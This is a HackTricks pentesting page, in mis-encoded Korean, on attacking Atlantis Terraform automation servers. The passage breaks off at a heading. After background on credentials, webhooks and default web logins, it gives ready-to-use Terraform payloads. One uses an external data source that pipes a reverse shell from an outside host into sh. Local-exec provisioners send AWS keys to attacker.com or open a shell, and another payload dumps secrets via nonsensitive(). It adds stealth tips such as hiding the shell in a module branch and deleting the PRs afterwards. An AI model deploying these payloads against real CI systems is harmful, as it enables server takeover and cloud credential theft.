# Atlantis Security

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸°ë¥¼ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

AtlantisëŠ” ê¸°ë³¸ì ìœ¼ë¡œ git ì„œë²„ì—ì„œ Pull Requestsë¥¼ í†µí•´ terraformì„ ì‹¤í–‰í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

![](<../.gitbook/assets/image (51).png>)

## ë¡œì»¬ ë©

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)ì˜ **atlantis ë¦´ë¦¬ìŠ¤ í˜ì´ì§€**ë¡œ ì´ë™í•˜ì—¬ **ì í•©í•œ** ë²„ì „ì„ **ë‹¤ìš´ë¡œë“œ**í•©ë‹ˆë‹¤.
2. **github** ì‚¬ìš©ìì˜ **repo ì•¡ì„¸ìŠ¤**ë¥¼ ê°€ì§„ **ê°œì¸ í† í°**ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. `./atlantis testdrive`ë¥¼ ì‹¤í–‰í•˜ë©´ **ë°ëª¨ ë¦¬í¬**ê°€ ìƒì„±ë˜ì–´ **atlantisì™€ ëŒ€í™”**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
4. ì›¹ í˜ì´ì§€ì—ëŠ” 127.0.0.1:4141ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Atlantis ì•¡ì„¸ìŠ¤

### Git ì„œë²„ ìê²© ì¦ëª…

**Atlantis**ëŠ” **Github**, **Gitlab**, **Bitbucket** ë° **Azure DevOps**ì™€ ê°™ì€ ì—¬ëŸ¬ git í˜¸ìŠ¤íŠ¸ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ í”Œë«í¼ì˜ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•˜ê³  ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ì¼ë¶€ **ê¶Œí•œì´ ë¶€ì—¬ëœ íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤**ê°€ í•„ìš”í•©ë‹ˆë‹¤.\
[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional)ì—ì„œëŠ” Atlantisë¥¼ ìœ„í•´ íŠ¹ì • í”Œë«í¼ì— ì‚¬ìš©ìë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì„ ê¶Œì¥í•˜ì§€ë§Œ ì¼ë¶€ ì‚¬ëŒë“¤ì€ ê°œì¸ ê³„ì •ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì–´ë–¤ ê²½ìš°ì—ë„, ê³µê²©ìì˜ ê´€ì ì—ì„œëŠ” **Atlantis ê³„ì •**ì´ ë§¤ìš° **í¥ë¯¸ë¡œìš´ ëŒ€ìƒ**ì´ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ì›¹í›…

AtlantisëŠ” ì„ íƒì ìœ¼ë¡œ [**ì›¹í›… ë¹„ë°€**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret)ì„ ì‚¬ìš©í•˜ì—¬ Git í˜¸ìŠ¤íŠ¸ë¡œë¶€í„° ìˆ˜ì‹ í•œ **ì›¹í›…**ì´ **ì •ë‹¹í•œì§€** í™•ì¸í•©ë‹ˆë‹¤.

ì´ë¥¼ í™•ì¸í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ ìš”ì²­ì´ Git í˜¸ìŠ¤íŠ¸ì˜ IPì—ì„œë§Œ ì˜¬ ìˆ˜ ìˆë„ë¡ **í—ˆìš© ëª©ë¡**ì„ ì„¤ì •í•˜ëŠ” ê²ƒì´ì§€ë§Œ, ì›¹í›… ë¹„ë°€ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë” ì‰¬ìš´ ë°©ë²•ì…ë‹ˆë‹¤.

ì°¸ê³ ë¡œ, ê°œì¸ github ë˜ëŠ” bitbucket ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” í•œ ì›¹í›… ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì¸í„°ë„·ì— ë…¸ì¶œí•´ì•¼ í•©ë‹ˆë‹¤.

{% hint style="warning" %}
AtlantisëŠ” git ì„œë²„ê°€ ì •ë³´ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆë„ë¡ **ì›¹í›…ì„ ë…¸ì¶œ**í•  ê²ƒì…ë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œëŠ” **ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆëŠ”ì§€** ì•Œ ìˆ˜ ìˆëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ê³µê¸‰ì ìê²© ì¦ëª… <a href="#provider-credentials" id="provider-credentials"></a>

[ë¬¸ì„œì—ì„œ](https://www.runatlantis.io/docs/provider-credentials.html)ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì„¤ëª…í•©ë‹ˆë‹¤:

AtlantisëŠ” Terraformì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë‹¨ìˆœíˆ ì„œë²„ì—ì„œ `terraform plan` ë° `apply` ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ë¡œì»¬ì—ì„œ Terraformì„ ì‹¤í–‰í•  ë•Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ AtlantisëŠ” íŠ¹ì • ê³µê¸‰ìì˜ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤.

Atlantisì— íŠ¹ì • ê³µê¸‰ìì˜ ìê²© ì¦ëª…ì„ [ì œê³µí•˜ëŠ” ë°©ë²•](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info)ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ë° [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate)ì—ëŠ” ê³µê¸‰ì ìê²© ì¦ëª…ì„ ìœ„í•œ ê³ ìœ í•œ ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ë¬¸ì„œë¥¼ ì½ìœ¼ì„¸ìš”.
* í´ë¼ìš°ë“œì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš° ë§ì€ í´ë¼ìš°ë“œì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì— í´ë¼ìš°ë“œ API ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆ:
* [AWS EC2 ì—­í• ](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (EC2 ì—­í•  ê²€ìƒ‰)
* [GCE ì¸ìŠ¤í„´ìŠ¤ ì„œë¹„ìŠ¤ ê³„ì •](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* ë§ì€ ì‚¬ìš©ìê°€ Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ìœ„ì¹˜ì— ë”°ë¼ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì˜ˆ: `AWS_ACCESS_KEY`
* ë‹¤ë¥¸ ì‚¬ìš©ìëŠ” Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ìœ„ì¹˜ì— í•„ìš”í•œ êµ¬ì„± íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤. ì˜ˆ: `~/.aws/credentials`
* [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs)ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê¸‰ì ìê²© ì¦ëª…ì„ ì–»ìŠµë‹ˆë‹¤.

{% hint style="warning" %}
Atlantisê°€ **ì‹¤í–‰**ë˜ëŠ” **ì»¨í…Œì´ë„ˆ**ì—ëŠ” Atlantisê°€ Terraformì„ í†µí•´ ê´€ë¦¬í•˜ëŠ” ê³µê¸‰ì (AWS, GCP, Github...)ì— ëŒ€í•œ **íŠ¹ê¶Œ ìê²© ì¦ëª…**ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ì›¹ í˜ì´ì§€

ê¸°ë³¸ì ìœ¼ë¡œ AtlantisëŠ” **ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ í¬íŠ¸ 4141ì—ì„œ ì›¹ í˜ì´ì§€ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤. ì´ í˜ì´ì§€ëŠ” atlantis applyë¥¼ í™œì„±í™”/ë¹„í™œì„±í™”í•˜ê³  ë¦¬í¬ì§€í† ë¦¬ì˜ ê³„íš ìƒíƒœë¥¼ í™•ì¸í•˜ë©° ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì ê¸ˆ í•´ì œí•˜ëŠ” ê¸°ëŠ¥ë§Œ ì œê³µí•©ë‹ˆë‹¤ (ë”°ë¼ì„œ ìˆ˜ì •í•˜ëŠ” ê¸°ëŠ¥ì€ ì œê³µë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ê·¸ë‹¤ì§€ ìœ ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

ì•„ë§ˆë„ ì¸í„°ë„·ì— ë…¸ì¶œë˜ì§€ ì•Šì„ ê²ƒì´ì§€ë§Œ, ê¸°ë³¸ì ìœ¼ë¡œ ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•´ **ìê²© ì¦ëª…ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤** (í•„ìš”í•œ ê²½ìš° `atlantis`:`atlantis`ê°€ **ê¸°ë³¸**ì…ë‹ˆë‹¤).

## ì„œë²„ êµ¬ì„±

`atlantis server`ì˜ êµ¬ì„±ì€ ëª…ë ¹ì¤„ í”Œë˜ê·¸, í™˜ê²½ ë³€ìˆ˜, êµ¬ì„± íŒŒì¼ ë˜ëŠ” ì´ ì„¸ ê°€ì§€ì˜ ì¡°í•©ì„ í†µí•´ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* Atlantis ì„œë²„ì—ì„œ ì§€ì›í•˜ëŠ” [**í”Œë˜ê·¸ ëª©ë¡ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* [**êµ¬ì„± ì˜µì…˜ì„ í™˜ê²½ ë³€ìˆ˜ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

ê°’ì€ ë‹¤ìŒê³¼ ê°™ì€ **ìˆœì„œë¡œ ì„ íƒ**ë©ë‹ˆë‹¤:

1. í”Œë˜ê·¸
2. í™˜ê²½ ë³€ìˆ˜
3. êµ¬ì„± íŒŒì¼

{% hint style="warning" %}
êµ¬ì„±ì—ì„œëŠ” **í† í° ë° ë¹„ë°€ë²ˆí˜¸**ì™€ ê°™ì€ í¥ë¯¸ë¡œìš´ ê°’ë“¤ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„±

ì¼ë¶€ êµ¬ì„±ì€ **ë¦¬í¬ì§€í† ë¦¬ê°€ ê´€ë¦¬ë˜ëŠ” ë°©ì‹**ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ê° ë¦¬í¬ì§€í† ë¦¬ê°€ ë‹¤ë¥¸ ì„¤ì •ì„ í•„ìš”ë¡œ í•  ìˆ˜** ìˆìœ¼ë¯€ë¡œ ê° ë¦¬

#### PR Protections

AtlantisëŠ” **PR**ì´ \*\*`approved`\*\*ë˜ê¸°ë¥¼ ì›í•˜ëŠ” ê²½ìš° (branch protectionì— ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°ì—ë„) ë‹¤ë¥¸ ì‚¬ëŒì— ì˜í•´ ìŠ¹ì¸ë˜ë„ë¡í•˜ê³ /ë˜ëŠ” \*\*`mergeable`\*\*í•˜ë„ë¡ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (branch protection í†µê³¼ í›„) **applyë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì—**. ë³´ì•ˆì ì¸ ì¸¡ë©´ì—ì„œëŠ” ë‘ ê°€ì§€ ì˜µì…˜ì„ ëª¨ë‘ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

`allowed_overrides`ê°€ Trueì¸ ê²½ìš°, ì´ ì„¤ì •ì€ **ê° í”„ë¡œì íŠ¸ì—ì„œ `/atlantis.yml` íŒŒì¼ë¡œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### Scripts

ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„±ì€ ì›Œí¬í”Œë¡œìš°ê°€ ì‹¤í–‰ë˜ê¸° **ì „ì—** (_pre workflow hooks_) [**ì‹¤í–‰í•  ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì •**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage)í•˜ê±°ë‚˜ ì›Œí¬í”Œë¡œìš°ê°€ ì‹¤í–‰ëœ **í›„ì—** (_post workflow hooks_) [**ì‹¤í–‰í•  ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì •**](https://www.runatlantis.io/docs/post-workflow-hooks.html)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¦¬í¬ì§€í† ë¦¬ `/atlantis.yml` íŒŒì¼ì—ì„œ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆëŠ” ì˜µì…˜ì´ ì—†ìŠµë‹ˆë‹¤.

#### Workflow

ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„± (ì„œë²„ ì¸¡ êµ¬ì„±)ì—ì„œëŠ” [**ìƒˆë¡œìš´ ê¸°ë³¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì§€ì •**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)í•˜ê±°ë‚˜ [**ìƒˆë¡œìš´ ì‚¬ìš©ì ì •ì˜ ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒì„±**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë˜í•œ ìƒì„±ëœ **ìƒˆë¡œìš´** ì›Œí¬í”Œë¡œìš°ì— **ì ‘ê·¼í•  ìˆ˜ ìˆëŠ”** **ë¦¬í¬ì§€í† ë¦¬**ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ° ë‹¤ìŒ, ê° ë¦¬í¬ì§€í† ë¦¬ì˜ **atlantis.yaml** íŒŒì¼ì—ì„œ ì‚¬ìš©í•  ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
[**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ëœ ê²½ìš°, ê° ë¦¬í¬ì§€í† ë¦¬ì˜ **`atlantis.yaml`** íŒŒì¼ì—ì„œ ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ \*\*`allowed_overrides`\*\*ê°€ ì‚¬ìš©ë  ì›Œí¬í”Œë¡œìš°ë¥¼ **ë®ì–´ì“°ê¸°**í•˜ê¸° ìœ„í•´ \*\*`workflow`\*\*ë„ ì§€ì •ë˜ì–´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ì‚¬ì‹¤ìƒ í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ Atlantis ì„œë²„ì—ì„œ **RCEë¥¼ ì œê³µ**í•©ë‹ˆë‹¤.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest ì •ì±… í™•ì¸

AtlantisëŠ” ê³„íš ì¶œë ¥ì— ëŒ€í•´ **ì„œë²„ ì¸¡** [**conftest**](https://www.conftest.dev/) **ì •ì±…**ì„ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ë¥¼ ì‚¬ìš©í•˜ëŠ” ì¼ë°˜ì ì¸ ì‚¬ë¡€ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ëª¨ë“ˆ ëª©ë¡ ì‚¬ìš© ê±°ë¶€
* ë¦¬ì†ŒìŠ¤ ìƒì„± ì‹œ ë¦¬ì†ŒìŠ¤ì˜ ì†ì„± ë‹¨ì–¸
* ì˜ë„í•˜ì§€ ì•Šì€ ë¦¬ì†ŒìŠ¤ ì‚­ì œ ê°ì§€
* ë³´ì•ˆ ìœ„í—˜ ë°©ì§€ (ì˜ˆ: ê³µê°œ í¬íŠ¸ ë…¸ì¶œ)

[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works)ì—ì„œ êµ¬ì„±í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Atlantis ëª…ë ¹ì–´

[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis)ì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì˜µì…˜ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```

## ê³µê²©

{% hint style="warning" %}
ê³µê²© ì¤‘ì— ë‹¤ìŒ **ì˜¤ë¥˜**ë¥¼ ë°œê²¬í•˜ë©´: `Error: Error acquiring the state lock`

ë‹¤ìŒì„ ì‹¤í–‰í•˜ì—¬ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis ê³„íš RCE - ìƒˆë¡œìš´ PRì—ì„œ êµ¬ì„± ë³€ê²½

ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ” ì €ì¥ì†Œì—ì„œëŠ” ìƒˆë¡œìš´ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `atlantis plan`ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ (ë˜ëŠ” ìë™ìœ¼ë¡œ ì‹¤í–‰ë  ìˆ˜ë„ ìˆìŒ) Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ìœ„í•´ [Atlantisê°€ ì™¸ë¶€ ë°ì´í„° ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë„ë¡](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `main.tf` íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë„£ì–´ì£¼ì„¸ìš”:

```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### ì€ë°€í•œ ê³µê²©

ì´ ê³µê²©ì„ ë” ì€ë°€í•˜ê²Œ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì˜ ì œì•ˆì„ ë”°ë¼ì„œ:

* í…Œë¼í¼ íŒŒì¼ì— ì§ì ‘ì ìœ¼ë¡œ ì—­ì‰˜ì´ í¬í•¨ë˜ëŠ” ëŒ€ì‹ , ì—­ì‰˜ì„ í¬í•¨í•˜ëŠ” **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)ì—ì„œ rev shell ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ì—ì„œëŠ” **ref** ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ **repo ë‚´ì˜ ë¸Œëœì¹˜ì— terraform rev shell ì½”ë“œë¥¼ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì˜ˆë¥¼ ë“¤ì–´ `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`ì™€ ê°™ì´ ì‚¬ìš©í•©ë‹ˆë‹¤.
* Atlantisë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ **ë§ˆìŠ¤í„°ë¡œ PRì„ ìƒì„±í•˜ëŠ” ëŒ€ì‹ **, **2ê°œì˜ ë¸Œëœì¹˜** (test1ê³¼ test2)ë¥¼ ìƒì„±í•˜ê³  **í•œ ë¸Œëœì¹˜ì—ì„œ ë‹¤ë¥¸ ë¸Œëœì¹˜ë¡œ PRì„ ìƒì„±**í•©ë‹ˆë‹¤. ê³µê²©ì„ ì™„ë£Œí•œ í›„, **PRê³¼ ë¸Œëœì¹˜ë¥¼ ì‚­ì œ**í•©ë‹ˆë‹¤.

### Atlantis plan Secrets Dump

`atlantis plan` (`terraform plan`)ì„ ì‹¤í–‰í•˜ì—¬ **terraformì—ì„œ ì‚¬ìš©ë˜ëŠ” ë¹„ë°€ ì •ë³´ë¥¼ ë¤í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ terraform íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì´ ì¶”ê°€í•©ë‹ˆë‹¤:

```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```

### Atlantis apply RCE - ìƒˆë¡œìš´ PRì—ì„œì˜ êµ¬ì„± ìˆ˜ì •

ë§Œì•½ ë¦¬í¬ì§€í† ë¦¬ì— ì“°ê¸° ê¶Œí•œì´ ìˆë‹¤ë©´, í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ìƒˆë¡œìš´ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ **`atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

í•˜ì§€ë§Œ, ì¼ë°˜ì ìœ¼ë¡œ ì¼ë¶€ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤:

* **ë³‘í•© ê°€ëŠ¥(Mergeable)**: ë§Œì•½ Atlantisì—ì„œ ì´ ë³´í˜¸ ê¸°ëŠ¥ì´ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, **PRì´ ë³‘í•© ê°€ëŠ¥í•œ ê²½ìš°ì—ë§Œ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì¦‰, ë¸Œëœì¹˜ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤).
* [**ë¸Œëœì¹˜ ë³´í˜¸ ìš°íšŒ**](https://github.com/carlospolop/hacktricks-cloud/blob/kr/pentesting-ci-cd/broken-reference/README.md)ì— ëŒ€í•œ ê°€ëŠ¥í•œ ìš°íšŒ ë°©ë²• í™•ì¸
* **ìŠ¹ì¸(Approved)**: ë§Œì•½ Atlantisì—ì„œ ì´ ë³´í˜¸ ê¸°ëŠ¥ì´ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, **ë‹¤ë¥¸ ì‚¬ìš©ìê°€ PRì„ ìŠ¹ì¸í•´ì•¼ë§Œ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* ê¸°ë³¸ì ìœ¼ë¡œ [**Gitbot í† í°ì„ ì•…ìš©í•˜ì—¬ ì´ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒ**](https://github.com/carlospolop/hacktricks-cloud/blob/kr/pentesting-ci-cd/broken-reference/README.md)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•…ì˜ì ì¸ Terraform íŒŒì¼ì— **`local-exec`ì„ ì‚¬ìš©í•˜ì—¬ `terraform apply`ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤.\
ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œê°€ `main.tf` íŒŒì¼ì— í¬í•¨ë˜ë„ë¡ë§Œ í™•ì¸í•˜ë©´ ë©ë‹ˆë‹¤:

```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```

ì´ì „ ê¸°ìˆ ì—ì„œ ì œì•ˆí•œ ë‚´ìš©ì„ ë”°ë¥´ë©´ ì´ ê³µê²©ì„ **ë” ì€ë°€í•˜ê²Œ** ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Terraform Param Injection

